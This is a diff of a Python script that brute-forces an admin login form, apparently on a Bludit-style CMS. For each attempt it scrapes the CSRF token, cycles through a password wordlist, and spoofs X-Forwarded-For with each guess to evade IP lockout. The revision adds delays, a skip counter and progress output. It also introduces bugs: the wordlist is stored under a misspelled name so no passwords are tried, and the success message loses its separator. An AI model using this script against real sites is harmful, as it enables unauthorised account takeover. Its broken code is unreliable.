@@ -1,44 +1,60 @@
 #!/usr/bin/env python3
 import re
+import time
 import requests
 
-host = "http://127.0.0.1" # change to the appropriate URL
+DELAY = 0.25
+SKIP = 0
+HOST = "http://127.0.0.1"  # change to the appropriate URL
 
-login_url = host + '/admin/login'
-username = 'admin' # Change to the appropriate username
-fname = "/home/admin/Desktop/test.txt" #change this to the appropriate file you can specify the full path to the file
-with open(fname) as f:
+LOGIN_URL = HOST + "/admin/login"
+USERNAME = "admin"  # Change to the appropriate username
+PASSWORDFILE = "passwords.txt"  # change this to the appropriate file you can specify the full path to the file
+print("Reading password list...")
+wordlist = []
+with open(PASSWORDFILE) as f:
     content = f.readlines()
-    word1 = [x.strip() for x in content] 
-wordlist = word1
+    word1ist = [x.strip() for x in content]
 
+size = len(wordlist)
+print("Read {} passwords".format(size))
+
+i = 0
 for password in wordlist:
+    i += 1
+    if i < SKIP:
+        continue
     session = requests.Session()
-    login_page = session.get(login_url)
-    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+    login_page = session.get(LOGIN_URL)
+    csrf_token = re.search(
+        'input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text
+    ).group(1)
 
-    print('[*] Trying: {p}'.format(p = password))
+    print("[{}/{}][*] Trying: {}".format(i, size, password))
 
     headers = {
-        'X-Forwarded-For': password,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
-        'Referer': login_url
+        "X-Forwarded-For": password,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
+        "Referer": LOGIN_URL,
     }
 
     data = {
-        'tokenCSRF': csrf_token,
-        'username': username,
-        'password': password,
-        'save': ''
+        "tokenCSRF": csrf_token,
+        "username": USERNAME,
+        "password": password,
+        "save": "",
     }
 
-    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+    login_result = session.post(
+        LOGIN_URL, headers=headers, data=data, allow_redirects=False, timeout=10
+    )
 
-    if 'location' in login_result.headers:
-        if '/admin/dashboard' in login_result.headers['location']:
+    if "location" in login_result.headers:
+        if "/admin/dashboard" in login_result.headers["location"]:
             print()
-            print('SUCCESS: Password found!')
-            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print("SUCCESS: Password found!")
+            print("Use {}{} to login.".format(USERNAME, password))
             print()
             break
-
+    else:
+        time.sleep(DELAY)
